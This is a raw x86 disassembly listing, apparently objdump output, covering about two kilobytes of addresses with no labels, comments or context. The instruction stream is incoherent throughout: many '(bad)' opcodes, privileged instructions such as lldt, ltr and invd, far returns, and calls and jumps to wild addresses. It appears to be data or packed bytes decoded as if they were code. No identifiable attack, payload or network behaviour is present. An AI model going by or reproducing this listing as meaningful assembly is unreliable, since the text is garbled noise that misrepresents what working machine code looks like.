  4196be:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  4196c4:	mov    bh,0x8c
  4196c6:	adc    al,0x9c
  4196c8:	dec    esp
  4196c9:	xor    bl,BYTE PTR [eax]
  4196cb:	mov    ecx,DWORD PTR [ebp+0xc]
  4196ce:	mov    eax,DWORD PTR [ebp-0x4]
  4196d1:	mov    esi,DWORD PTR [edi-0x3148f924]
  4196d7:	push   es
  4196d8:	retf   
  4196d9:	mov    BYTE PTR [ebp-0x30],0x3b
  4196dd:	inc    ebp
  4196de:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  4196e5:	retf   0x83fc
  4196e8:	into   
  4196e9:	dec    ebp
  4196ea:	retf   
  4196eb:	mov    ecx,DWORD PTR [ebp-0x74]
  4196ee:	mov    eax,DWORD PTR [eax]
  4196f0:	fdiv   QWORD PTR [ebx]
  4196f2:	mov    bh,0x3
  4196f4:	push   es
  4196f5:	mov    esi,ecx
  4196f7:	sbb    cl,dl
  4196f9:	dec    ebp
  4196fa:	sar    DWORD PTR [ebx],cl
  4196fc:	push   ebp
  4196fd:	jne    0x41970e
  4196ff:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  419705:	lea    ebx,[eax]
  419707:	call   0xf4cb22ce
  41970c:	sbb    dh,dl
  41970e:	add    edx,ebx
  419710:	push   ebp
  419711:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  419717:	push   ecx
  419718:	mov    DWORD PTR [eax-0x30],edx
  41971b:	test   DWORD PTR [edx],eax
  41971d:	xadd   esp,esi
  419720:	pop    es
  419721:	add    cl,dl
  419723:	mov    eax,ecx
  419725:	or     al,0x45
  419727:	(bad)  
  419728:	push   eax
  419729:	add    DWORD PTR [edx+0x0],eax
  41972c:	add    ecx,DWORD PTR [ecx]
  41972e:	and    dh,cl
  419730:	call   0xc5a000
  419735:	add    DWORD PTR [ebp+0x0],edx
  419738:	mov    esp,DWORD PTR [ebp+0x18]
  41973b:	add    BYTE PTR [eax+0x54],cl
  41973e:	xor    eax,DWORD PTR [eax]
  419740:	add    esp,DWORD PTR [esi+0x3b]
  419743:	inc    ebp
  419744:	je     0x4196c9
  419746:	push   ecx
  419747:	cli    
  419748:	dec    ebp
  419749:	mov    DWORD PTR [ebx],eax
  41974b:	(bad)  
  41974c:	or     al,0x5e
  41974e:	inc    eax
  41974f:	add    BYTE PTR [ebx],al
  419751:	data16 and BYTE PTR [ebp+0x50],al
  419755:	sub    DWORD PTR [ecx],0xfffffff8
  419758:	add    BYTE PTR [ebp-0x75],ah
  41975b:	add    BYTE PTR [eax],bl
  41975d:	enter  0x894d,0x8b
  419761:	int3   
  419762:	loopne 0x419726
  419764:	rol    BYTE PTR [eax],0x33
  419767:	lea    cx,[ebp+0xa]
  41976b:	data16 jb 0x4197b3
  41976e:	add    BYTE PTR [ebx+0x44890855],cl
  419774:	sbb    ah,al
  419776:	inc    ebp
  419777:	lldt   WORD PTR ds:[edx+0x66]
  41977c:	xor    ecx,DWORD PTR [eax]
  41977e:	sub    eax,DWORD PTR [ebx+ecx*4]
  419781:	add    BYTE PTR [esi+eiz*2],cl
  419784:	ror    edx,cl
  419786:	dec    ebp
  419787:	inc    ebp
  419788:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  41978e:	cld    
  41978f:	or     BYTE PTR [edi+0x4501dd],dl
  419795:	(bad)  
  419796:	into   
  419797:	out    dx,al
  419798:	retf   
  419799:	(bad)  
  41979a:	dec    ebp
  41979b:	mov    al,0x8b
  41979d:	loop   0x4197bf
  41979f:	cmp    ecx,DWORD PTR [edx]
  4197a1:	inc    ebp
  4197a2:	daa    
  4197a3:	loop   0x41972c
  4197a5:	out    dx,al
  4197a6:	add    edi,eax
  4197a8:	add    BYTE PTR [eax+0x3f52e155],bh
  4197ae:	push   ebp
  4197af:	inc    ebp
  4197b0:	xor    ebx,esp
  4197b2:	add    ebp,esi
  4197b4:	push   edx
  4197b5:	push   bp
  4197b7:	inc    ebp
  4197b8:	(bad)  
  4197b9:	in     eax,dx
  4197ba:	push   esp
  4197bb:	(bad)  
  4197bc:	inc    edx
  4197be:	sbb    al,0x33
  4197c0:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4197c7:	add    BYTE PTR [ebp+0x47],0x8b
  4197cb:	jmp    0xf98b:0x100041c8
  4197d2:	xor    esi,DWORD PTR [edx+0x3]
  4197d5:	mov    ecx,DWORD PTR [edi]
  4197d7:	fmul   DWORD PTR [edx]
  4197d9:	add    BYTE PTR [eax],al
  4197db:	lea    eax,[ebx-0x4700273c]
  4197e1:	add    al,0x4f
  4197e3:	pop    DWORD PTR [eax]
  4197e5:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  4197eb:	push   edx
  4197ec:	inc    WORD PTR [ebp+0x8]
  4197f0:	mov    eax,0x514f4d
  4197f5:	(bad)
  4197f9:	add    al,al
  4197fb:	xor    DWORD PTR [ebx-0x74baf730],eax
  419801:	test   DWORD PTR [esi+0x74],esp
  419804:	inc    ebp
  419805:	mov    DWORD PTR [eax+0xa4e08],edi
  41980b:	add    BYTE PTR [ecx-0x76c435bb],cl
  419811:	or     dh,cl
  419813:	or     eax,0x8b8d5045
  419818:	inc    ebp
  419819:	mov    WORD PTR [ecx+0x3b8a00],?
  41981f:	jne    0x419854
  419821:	mov    edi,DWORD PTR [edx+0x8f3b18]
  419827:	add    DWORD PTR [ebx],eax
  419829:	add    bh,bh
  41982b:	adc    DWORD PTR [eax],ecx
  41982d:	adc    DWORD PTR [ebp+0x55],edi
  419830:	push   es
  419831:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  419837:	mov    ebp,DWORD PTR [eax+ebp*1+0x503a11dc]
  41983e:	inc    ebp
  41983f:	mov    esp,edi
  419841:	or     al,0xdc
  419843:	push   eax
  419844:	(bad)  
  419845:	jne    0x4197fb
  419847:	call   0x399138
  41984c:	inc    ebp
  41984d:	sar    BYTE PTR [edx],0x84
  419850:	out    dx,al
  419851:	add    bh,al
  419853:	add    BYTE PTR [ebp+esi*2-0x247424],bh
  41985a:	(bad)  
  41985b:	and    al,al
  41985d:	fs in  eax,dx
  41985f:	inc    DWORD PTR [ebp-0x7b]
  419862:	jo     0x419873
  419864:	leave  
  419865:	scas   al,BYTE PTR es:[edi]
  419866:	inc    esp
  419867:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  41986e:	or     BYTE PTR [ebx-0x97717c9],0x83
  419875:	call   DWORD PTR [edi]
  419877:	shr    ah,0x84
  41987a:	xchg   DWORD PTR [eax],eax
  41987c:	add    DWORD PTR [eax],eax
  41987e:	add    bh,bh
  419880:	dec    ebp
  419881:	and    BYTE PTR [ecx-0x38],dl
  419884:	push   eax
  419885:	dec    DWORD PTR [ebx+0xfd885]
  41988b:	mov    BYTE PTR [ebp+0x508bac00],cl
  419891:	mov    WORD PTR [ecx+0x0],ss
  419894:	lea    ecx,[ebx+0x108b20d8]
  41989a:	mov    WORD PTR [edx],ds
  41989c:	add    BYTE PTR [edi+0xff01ff],al
  4198a2:	mov    ecx,DWORD PTR [ebp-0x28]
  4198a5:	push   ecx
  4198a6:	shl    BYTE PTR [ebp+0x3a],0x8b
  4198aa:	inc    ebp
  4198ab:	in     al,0xeb
  4198ad:	jno    0x41983a
  4198af:	push   edx
  4198b0:	mov    DWORD PTR [eax-0x28],edx
  4198b3:	mov    eax,DWORD PTR [ebp+0x20]
  4198b6:	je     0x41983f
  4198b8:	mov    eax,DWORD PTR [ecx]
  4198ba:	sbb    BYTE PTR [eax],al
  4198bc:	pop    DWORD PTR [eax]
  4198be:	add    esi,eax
  4198c0:	add    bl,al
  4198c2:	adc    DWORD PTR [edi],esi
  4198c4:	jmp    0x8bcce916
  4198c9:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  4198d0:	jne    0x41985d
  4198d2:	mov    ecx,DWORD PTR [eax]
  4198d4:	in     al,0x75
  4198d6:	pop    DWORD PTR [ecx+0x5501]
  4198dc:	push   edx
  4198dd:	inc    DWORD PTR [ebx]
  4198df:	adc    BYTE PTR [ecx+0x45721cc6],cl
  4198e5:	add    BYTE PTR [edi+0x9],dl
  4198e8:	call   DWORD PTR [esi]
  4198ea:	and    dl,al
  4198ec:	and    bh,bh
  4198ee:	inc    edi
  4198f0:	test   eax,edx
  4198f2:	sldt   ebx
  4198f5:	xor    BYTE PTR [eax],al
  4198f7:	pushf  
  4198f8:	(bad)  
  4198f9:	jmp    0x419907
  4198fb:	mov    eax,edi
  4198fd:	or     al,0x75
  4198ff:	inc    eax
  419900:	call   0x419008
  419905:	mov    eax,eax
  419907:	loopne 0x41988d
  419909:	inc    ebp
  41990a:	add    BYTE PTR [ebx+0x1451c00],cl
  419910:	mov    eax,DWORD PTR [ebp+0x20]
  419913:	add    edi,ecx
  419915:	add    BYTE PTR [eax],ch
  419917:	cmp    edi,0x18
  41991a:	test   DWORD PTR [ebp+0xf],esi
  41991d:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  419924:	jne    0x419928
  419926:	call   0xffa093eb
  41992b:	leave  
  41992c:	rcr    BYTE PTR [esp+eax*4],0x55
  419930:	add    ah,ch
  419932:	add    BYTE PTR [edi-0x48fef979],dh
  419938:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  41993f:	inc    esp
  419940:	mov    ebx,DWORD PTR [eax]
  419942:	fcom   st(2)
  419944:	add    BYTE PTR [edi],bl
  419946:	lea    ecx,[eax-0x18]
  419949:	(bad)  
  41994a:	push   DWORD PTR [ecx]
  41994c:	call   0xffb3e6ae
  419951:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  419955:	fstp   DWORD PTR [esi+ebx*8]
  419958:	push   ebp
  419959:	pop    ebp
  41995a:	mov    esi,DWORD PTR [edx-0x38]
  41995d:	add    DWORD PTR [eax],0x28
  419960:	mov    edi,DWORD PTR [ebx]
  419962:	xor    esi,DWORD PTR [edx+0x3]
  419965:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  419969:	pop    ebp
  41996a:	or     al,0x4
  41996c:	inc    ecx
  41996d:	push   ebp
  41996e:	(bad)  
  41996f:	in     al,dx
  419970:	or     ah,ch
  419972:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419973:	xbegin 0xffc70f69
  419979:	clc    
  41997a:	adc    al,0x45
  41997c:	div    BYTE PTR [eax]
  41997e:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  419985:	test   DWORD PTR [eax+edi*8+0x666300],ebx
  41998c:	jno    0x4199f4
  41998e:	add    eax,DWORD PTR [ebp+0x52]
  419991:	adc    eax,0xffffffa0
  419994:	xchg   DWORD PTR [ecx+0x4800fc01],ecx
  41999a:	test   DWORD PTR [eax],eax
  41999c:	clc    
  41999d:	data16 or al,BYTE PTR [ebp+0x45]
  4199a1:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  4199a8:	rol    BYTE PTR [ebp+0x45],1
  4199ab:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4199b1:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4199b7:	push   ebx
  4199b8:	add    BYTE PTR [ebp+0x0],dl
  4199bb:	push   ecx
  4199bc:	jge    0x4199f1
  4199be:	add    BYTE PTR [esi+0x4],dl
  4199c1:	jne    0x419a28
  4199c3:	mov    edx,0x457200
  4199c8:	jmp    0x41998c
  4199ca:	xor    edi,DWORD PTR [ebx]
  4199cc:	pop    edi
  4199cd:	cvtdq2ps xmm7,xmm0
  4199d0:	ret    0x0
  4199d3:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4199d9:	xor    ecx,DWORD PTR [edi]
  4199db:	add    eax,DWORD PTR [ecx+0x3b]
  4199de:	push   ebx
  4199df:	rdpmc  
  4199e1:	out    0x8d,al
  4199e3:	add    BYTE PTR [eax],cl
  4199e5:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  4199eb:	ret    0x450c
  4199ee:	sbb    al,0x8b
  4199f0:	cmp    eax,esi
  4199f2:	or     cl,al
  4199f4:	or     al,0xc2
  4199f6:	pop    eax
  4199f7:	inc    ebp
  4199f8:	add    ecx,DWORD PTR [edi]
  4199fa:	add    esi,DWORD PTR [ebp+0x39]
  4199fd:	invd   
  4199ff:	jge    0x419a0b
  419a01:	mov    eax,0x478ac0
  419a06:	cli    
  419a07:	xor    esp,ecx
  419a09:	mov    ebx,0x5b8ac0
  419a0e:	ret    0x33
  419a11:	mov    eax,0x833b8b
  419a16:	sub    BYTE PTR [ebx],al
  419a18:	inc    ebp
  419a19:	xor    ax,di
  419a1c:	pushf  
  419a1d:	inc    bh
  419a1f:	mov    esp,esp
  419a21:	hlt    
  419a22:	test   DWORD PTR [ebp-0x8],esi
  419a25:	mov    eax,DWORD PTR [ebp-0x14]
  419a28:	xor    ecx,DWORD PTR [ebx-0x76478864]
  419a2e:	dec    edi
  419a2f:	or     BYTE PTR [eax],al
  419a31:	jne    0x4199bc
  419a33:	mov    esi,esp
  419a35:	call   0x77a825fa
  419a3a:	inc    ebp
  419a3b:	mov    DWORD PTR [eax+0x9c4f0c],edi
  419a41:	add    BYTE PTR [ecx-0x3ffe0717],cl
  419a47:	add    BYTE PTR [esi+0x7d],ah
  419a4a:	inc    ebp
  419a4b:	mov    bx,WORD PTR [ebp+0x8]
  419a4f:	add    DWORD PTR [ebp+0x55],0x30c008b
  419a56:	inc    ebp
  419a57:	mov    bx,di
  419a5a:	lock test BYTE PTR [ecx+0x7000801],bh
  419a61:	jge    0x419a24
  419a63:	mov    ecx,DWORD PTR [ebx-0x630613f0]
  419a69:	cli    
  419a6a:	xor    bl,bh
  419a6c:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  419a72:	test   BYTE PTR [eax],cl
  419a74:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  419a7b:	cmp    ebp,eax
  419a7d:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  419a84:	test   BYTE PTR [ebp+0x1],bh
  419a87:	mov    ebx,0x458a00
  419a8c:	xor    esi,DWORD PTR [ebx]
  419a8e:	add    esp,DWORD PTR [esi-0x77]
  419a91:	pop    ebp
  419a92:	loopne 0x419afa
  419a94:	inc    ebp
  419a95:	clc    
  419a96:	xor    edi,DWORD PTR [ebx]
  419a98:	add    esi,DWORD PTR [edx-0x77]
  419a9b:	data16 fdivr QWORD PTR [ebp-0x49]
  419a9f:	mov    ebx,0xb78afc
  419aa4:	hlt    
  419aa5:	xor    edi,DWORD PTR [esi]
  419aa7:	data16 add BYTE PTR [ebp+0x66],bl
  419aab:	data16 lock clc 
  419aae:	cmp    eax,DWORD PTR ds:[eax]
  419ab1:	ja     0x419b19
  419ab3:	psubq  mm7,QWORD PTR [ebp+0x4]
  419ab7:	ltr    WORD PTR [ebp+0x66]
  419abb:	add    esi,eax
  419abd:	add    di,WORD PTR [ebp+0x2b]
  419ac1:	data16 data16 jge 0x419b42
  419ac5:	mov    ebx,0xe08a8b
  419aca:	jge    0x419aff
  419acc:	data16 data16 xor al,0x5d
  419ad0:	data16 data16 jne 0x419acc
  419ad4:	mov    edi,DWORD PTR [ebx]
  419ad6:	fdiv   QWORD PTR [edx+0x7d]
  419ad9:	data16 data16 jge 0x419b11
  419add:	mov    ebx,0x758a66
  419ae2:	mov    esi,0x667233
  419ae7:	pop    ebp
  419ae8:	or     BYTE PTR [esi+0x0],ah
  419aeb:	clc    
  419aec:	mov    edi,DWORD PTR [ebx]
  419aee:	lock ja 0x419a7c
  419af1:	(bad)  
  419af3:	jge    0x419aec
  419af5:	invd   
  419af7:	pop    ebp
  419af8:	add    BYTE PTR [ebx],al
  419afa:	(bad)  
  419afb:	cmp    di,WORD PTR [ebp+0xf]
  419aff:	data16 sbb bh,BYTE PTR [ebp+0x0]
  419b03:	mov    bx,WORD PTR [ebp-0x10]
  419b07:	pop    bp
  419b09:	fbstp  TBYTE PTR [ebx]
  419b0b:	test   DWORD PTR [ebx],eax
  419b0d:	add    BYTE PTR [ebx],bh
  419b0f:	add    BYTE PTR [esi+0x7d],ah
  419b12:	jge    0x419a9f
  419b14:	data16 in al,dx
  419b16:	pop    ebp
  419b17:	stc    
  419b18:	bsf    ecx,DWORD PTR [ebp+0x6632009c]
  419b1f:	mov    edi,ebx
  419b21:	in     al,dx
  419b22:	test   BYTE PTR [ebp+0x0],bh
  419b25:	mov    eax,DWORD PTR [eax]
  419b27:	call   0xbd3e94b7
  419b2c:	ds pushf 
  419b2e:	add    BYTE PTR [edx],dh
  419b30:	mov    bx,di
  419b33:	call   0x8b4a18c3
  419b38:	add    ebp,esp
  419b3a:	mov    bx,di
  419b3d:	jnp    0x419b65
  419b3f:	mov    DWORD PTR [ebx+0x3e7df808],ecx
  419b45:	mov    eax,DWORD PTR [eax]
  419b47:	call   0x7c3d26b2
  419b4c:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  419b52:	data16 data16 fistp WORD PTR [ebp+0xe]
  419b57:	xor    DWORD PTR [edi-0x48fff7ab],0xfb66f403
  419b61:	fisttp WORD PTR [ecx-0x7401f77b]
  419b67:	(bad)  
  419b68:	cld    
  419b69:	jne    0x419ba9
  419b6b:	xor    eax,DWORD PTR [eax]
  419b6d:	mov    esp,DWORD PTR [esi-0x10]
  419b70:	sti    
  419b71:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  419b78:	data16 adc bl,bh
  419b7b:	push   ebp
  419b7c:	xor    ecx,DWORD PTR es:[ebx+0x3ee4f88b]
  419b83:	mov    WORD PTR [eax],es
  419b85:	pushf  
  419b86:	data16 xor bh,bl
  419b89:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  419b8f:	mov    esp,DWORD PTR [esi-0x14]
  419b92:	fisttp WORD PTR [ebx-0x3748a9f2]
  419b98:	or     al,0x2b
  419b9a:	mov    bh,0xba
  419b9c:	hlt    
  419b9d:	mov    bh,bl
  419b9f:	add    BYTE PTR [ecx-0x7446f3cd],cl
  419ba5:	dec    esi
  419ba6:	or     al,0x0
  419ba8:	mov    edi,DWORD PTR [ebx]
  419baa:	or     BYTE PTR [ebp+0x3b],dh
  419bad:	mov    ecx,DWORD PTR [edi]
  419baf:	fdivr  QWORD PTR [ebx-0x7499ff83]
  419bb5:	xor    al,0xd8
  419bb7:	pop    bp
  419bb9:	lock xor esi,DWORD PTR [ebx]
  419bbc:	lea    esp,[esi+0x1f]
  419bbf:	icebp  
  419bc0:	jb     0x419bc6
  419bc2:	add    al,al
  419bc4:	jge    0x419bd2
  419bc6:	mov    eax,eax
  419bc8:	fsubr  st,st(3)
  419bca:	pop    ebp
  419bcb:	mov    esi,DWORD PTR [ebx]
  419bcd:	in     al,0x8d
  419bcf:	rcr    DWORD PTR [edi],0xc2
  419bd2:	jb     0x419c32
  419bd4:	add    cl,cl
  419bd6:	jge    0x419be4
  419bd8:	mov    edx,DWORD PTR [ebp-0x20]
  419bdb:	in     al,dx
  419bdc:	pop    ebp
  419bdd:	data16 data16 or BYTE PTR [esi+edi*4],bh
  419be2:	cmp    di,WORD PTR [ebp+0x0]
  419be6:	mov    ebp,DWORD PTR [ebx]
  419be8:	fdivr  QWORD PTR [esi+0x668a5d]
  419bee:	cmp    al,0x33
  419bf0:	mov    si,0x4e7d
  419bf4:	mov    eax,DWORD PTR [eax]
  419bf6:	lock inc ebp
  419bf8:	mov    esi,DWORD PTR [esi]
  419bfa:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  419c01:	clc    
  419c02:	(bad)  
  419c03:	cmp    edi,DWORD PTR [ebx]
  419c05:	je     0x419c16
  419c07:	push   ebx
  419c08:	loopne 0x419c19
  419c0a:	dec    ecx
  419c0c:	mov    esp,DWORD PTR [esp+eiz*8-0x33]
  419c10:	icebp  
  419c11:	mov    esi,0x703084d
  419c16:	pcmpgtd mm6,mm1
  419c19:	add    BYTE PTR [ebp+0x66],dh
  419c1c:	jmp    0x419be9
  419c1e:	mov    eax,DWORD PTR [ebx]
  419c20:	lock push ebp
  419c22:	ror    DWORD PTR [ebp-0x2972feb3],1
  419c28:	or     bh,dl
  419c2a:	jb     0x419c2a
  419c2c:	add    BYTE PTR [ebx-0x1a7487b3],cl
  419c32:	loopne 0x419c34
  419c34:	jne    0x419c3a
  419c36:	data16 add BYTE PTR [esi+eiz*2],dh
  419c3a:	mov    ecx,ebx
  419c3c:	data16 ds icebp 
  419c3f:	add    BYTE PTR [esi],bh
  419c41:	data16 add bl,cl
  419c44:	retw   0xf2
  419c48:	ret    0x66
  419c4b:	retf   
  419c4c:	enterw 0x4df1,0x19
  419c51:	pop    edi
  419c52:	jne    0x419bd5
  419c54:	mov    esi,DWORD PTR [esi]
  419c56:	call   0x77b627f7
  419c5b:	xor    ebp,DWORD PTR [ebx]
  419c5d:	lea    esp,[esi+0x48]
  419c60:	repnz in eax,0x3b
  419c63:	add    BYTE PTR [ebp-0x37],dh
  419c66:	xor    edx,DWORD PTR [ebp-0x15]
  419c69:	in     al,dx
  419c6a:	xor    edx,DWORD PTR [esi+0x40]
  419c6d:	mov    DWORD PTR [edi],0x338545fc
  419c73:	clc    
  419c74:	add    esi,DWORD PTR [ecx]
  419c76:	pop    edi
  419c77:	pushf  
  419c78:	pop    ebx
  419c79:	call   0xff429c40
  419c7e:	mov    edi,eax
  419c80:	push   ecx
  419c81:	pop    es
  419c82:	mov    esi,DWORD PTR [edi]
  419c84:	push   esi
  419c85:	inc    edi
  419c86:	add    al,0x70
  419c88:	add    BYTE PTR [ecx+0x66],ah
  419c8b:	(bad)  
  419c8c:	into   
  419c8d:	fs ds int 0x0
  419c91:	mov    ecx,0x7ce0866
  419c96:	ret    0x66
  419c99:	add    bh,al
  419c9b:	add    al,0xfc
  419c9d:	add    BYTE PTR [ebp+0x31c3f866],al
  419ca3:	ds pushf 
  419ca5:	add    BYTE PTR [esi+0x66],ah
  419ca8:	into   
  419ca9:	ret    
  419caa:	pop    ebp
  419cab:	adc    al,0x57
  419cad:	add    BYTE PTR [edi-0x723c409a],dh
  419cb3:	add    edi,edi
  419cb5:	jne    0x419d0c
  419cb7:	lea    edx,[ecx+0x1]
  419cba:	mov    ebx,0xd64ff1
  419cbf:	sar    DWORD PTR [ebx],1
  419cc1:	test   BYTE PTR [ebp+0x38],dh
  419cc4:	mov    DWORD PTR [esp+edi*8-0x76],esp
  419cc8:	push   edi
  419cc9:	xor    BYTE PTR [ebx],0x37
  419ccc:	mov    esi,ebx
  419cce:	xor    eax,DWORD PTR [eax-0x3c738f9a]
  419cd4:	cmp    BYTE PTR [ebp+0x64],al
  419cd7:	pop    ebx
  419cd8:	mov    ebx,0x9c3b36
  419cdd:	je     0x419d0a
  419cdf:	xor    edi,DWORD PTR [ebx+0x668a33]
  419ce5:	mov    WORD PTR [ebx],?
  419ce7:	cmp    BYTE PTR [ebx+0x8b4e64],bh
  419ced:	pop    edi
  419cee:	cmp    ecx,ecx
  419cf0:	jne    0x419d47
  419cf2:	mov    ebp,esp
  419cf4:	cld    
  419cf5:	push   esi
  419cf6:	pop    ebx
  419cf7:	inc    ebp
  419cf8:	stc    
  419cf9:	test   DWORD PTR ss:[eax+edi*8-0x317af642],ebx
  419d01:	clc    
  419d02:	test   dl,dl
  419d04:	cmp    bh,bh
  419d06:	fs pop si
  419d09:	or     bl,al
  419d0b:	add    al,0x8b
  419d0d:	add    BYTE PTR [ecx+0x66],dl
  419d10:	push   edi
  419d11:	retf   0x3e45
  419d14:	add    BYTE PTR ss:[esi+eiz*2-0x3d7a3542],bl
  419d1c:	clc    
  419d1d:	add    BYTE PTR [ebx+0x66],bl
  419d20:	dec    edx
  419d22:	mov    edx,DWORD PTR [edi-0x76]
  419d25:	push   edi
  419d26:	add    al,0xb7
  419d28:	xor    al,0xba
  419d2a:	cmp    al,0x8d
  419d2c:	je     0x419d2d
  419d2e:	mov    edx,DWORD PTR [ebp-0x46]
  419d31:	push   ecx
  419d32:	lea    edi,[ebx+0x554fff]
  419d38:	push   ecx
  419d39:	cmp    edx,DWORD PTR [ebx+0x75]
  419d3c:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  419d42:	add    BYTE PTR [ebx],dh
  419d44:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  419d4a:	add    BYTE PTR [ebx+esi*1+0x4f64bb38],cl
  419d51:	mov    ebx,0x3b3b00
  419d56:	jne    0x419d83
  419d58:	mov    DWORD PTR [ebx+0x728afc],edi
  419d5e:	xor    esi,DWORD PTR [ebx]
  419d60:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  419d66:	push   edi
  419d67:	cmp    esp,ebp
  419d69:	jne    0x419d6b
  419d6b:	sbb    DWORD PTR [eax],0x8085c3fc
  419d71:	clc    
  419d72:	inc    edi
  419d73:	pop    ebx
  419d74:	sti    
  419d75:	add    eax,0xeb8bc075
  419d7a:	cld    
  419d7b:	xor    edi,DWORD PTR ds:0xf8c3855e
  419d81:	mov    ecx,DWORD PTR [ecx+edx*2]
  419d84:	rol    DWORD PTR [ebp-0x37],0xf
  419d88:	mov    DWORD PTR [eax],ecx
  419d8a:	inc    edi
  419d8b:	(bad)  
  419d8c:	in     eax,0xfc
  419d8e:	add    bh,bh
  419d90:	(bad)  
  419d91:	mov    esi,0xc38a5e
  419d96:	mov    esi,DWORD PTR [ebx]
  419d98:	push   ecx
  419d99:	mov    edi,0xfc4ec7
  419d9e:	test   DWORD PTR [ebp-0x8],edx
  419da1:	xor    di,ax
  419da4:	pushf  
  419da5:	sub    ebp,eax
  419da7:	inc    ebp
  419da8:	(bad)  
  419da9:	sub    edi,edi
  419dab:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  419db1:	inc    ebp
  419db2:	add    BYTE PTR [esi+0x2b],ah
  419db5:	or     bh,BYTE PTR [edx+0xf8ac2]
  419dbb:	cmp    al,0x33
  419dbd:	mov    edi,DWORD PTR [edx+0xfc4e81]
  419dc3:	(bad)  
  419dc4:	cmp    esi,DWORD PTR [ebx]
  419dc6:	je     0x419d80
  419dc8:	push   ebx
  419dc9:	dec    esi
  419dca:	str    ecx
  419dcd:	cmp    esp,DWORD PTR [ebp+esi*2-0x33]
  419dd1:	xor    edi,DWORD PTR [edi+0x789085f]
  419dd7:	mov    edx,DWORD PTR [esp+edi*8]
  419dda:	add    cl,cl
  419ddc:	data16 add al,0xcb
  419ddf:	push   ebp
  419de0:	add    ebp,esp
  419de2:	jne    0x419dd0
  419de4:	(bad)  
  419de5:	mov    DWORD PTR [ecx],0xd685f7ec
  419deb:	clc    
  419dec:	xlat   BYTE PTR ds:[ebx]
  419ded:	inc    ebp
  419dee:	mov    esi,DWORD PTR [eax]
  419df0:	push   eax
  419df1:	pushf  
  419df2:	in     eax,0x8b
  419df4:	add    ah,ch
  419df6:	add    al,0x55
  419df8:	add    BYTE PTR [ecx+0x66],dl
  419dfb:	add    eax,0x3e72cb
  419e00:	add    BYTE PTR [ebp+0x66],al
  419e03:	(bad)  
  419e04:	retf   
  419e05:	lock ret 0x85
  419e09:	clc    
  419e0a:	inc    bp
  419e0c:	retf   
  419e0d:	cmp    eax,0xc77d9cc8
  419e12:	ss cld 
  419e14:	pushf  
  419e15:	test   DWORD PTR [edi-0x8],ebx
  419e18:	je     0x419e5f
  419e1a:	xor    esi,DWORD PTR ds:0x7020840
  419e20:	ror    BYTE PTR [ebp-0x37],0x8d
  419e24:	push   ebp
  419e25:	add    esp,ebp
  419e27:	jb     0x419db4
  419e29:	add    BYTE PTR [eax],cl
  419e2b:	dec    ebp
  419e2c:	mov    bh,0x81
  419e2e:	push   esi
  419e2f:	push   ebp
  419e30:	adc    DWORD PTR [ecx-0x3c],0x3e9cff81
  419e37:	xor    al,BYTE PTR [eax]
  419e39:	mov    edx,DWORD PTR [edi+0x10]
  419e3c:	(bad)  
  419e3d:	scas   eax,DWORD PTR es:[edi]
  419e3e:	ret    0x3b
  419e41:	jns    0x3b429b34
  419e47:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  419e4b:	dec    ebp
  419e4c:	or     BYTE PTR [ebx],ch
  419e4e:	ret    0x458b
  419e51:	lock jmp 0x419e45
  419e54:	mov    ecx,DWORD PTR [eax]
  419e56:	or     BYTE PTR [edi],al
  419e58:	mov    ecx,eax
  419e5a:	xor    DWORD PTR [edx+0x2],0x0
  419e5e:	mov    bh,0xc1
  419e60:	adc    BYTE PTR [eax],dh
  419e62:	iret   
  419e63:	inc    ebp
  419e64:	mov    DWORD PTR [ebx],0x4dfff8c4
  419e6a:	inc    BYTE PTR [ebx]
  419e6c:	ret    0xf8
  419e6f:	adc    DWORD PTR [esi+0x10],esp
  419e72:	clc    
  419e73:	dec    ecx
  419e74:	fisttp WORD PTR [ecx+0x456604c0]
  419e7a:	add    dh,BYTE PTR ds:0x75e0845
  419e80:	ret    0x4d
  419e83:	lea    ecx,[ebx+0x18728301]
  419e89:	add    BYTE PTR [ebp+0x45],al
  419e8c:	xor    ecx,ebp
  419e8e:	pushf  
  419e8f:	add    bh,al
  419e91:	add    al,ch
  419e93:	inc    ebp
  419e94:	test   DWORD PTR [ebx-0x3eba0708],ecx
  419e9a:	xor    eax,0x781084d
  419e9f:	push   ebp
  419ea0:	pushf  
  419ea1:	push   ecx
  419ea2:	xor    al,BYTE PTR [ecx+0x32f89c89]
  419ea8:	inc    ebp
  419ea9:	cmp    edi,DWORD PTR [ecx]
  419eab:	jbe    0x419e49
  419ead:	mov    eax,edi
  419eaf:	or     ah,dh
  419eb1:	inc    ebp
  419eb2:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  419eb8:	xor    ecx,DWORD PTR [ebx-0x74747664]
  419ebe:	in     al,dx
  419ebf:	hlt    
  419ec0:	push   ebp
  419ec1:	push   ebp
  419ec2:	push   ecx
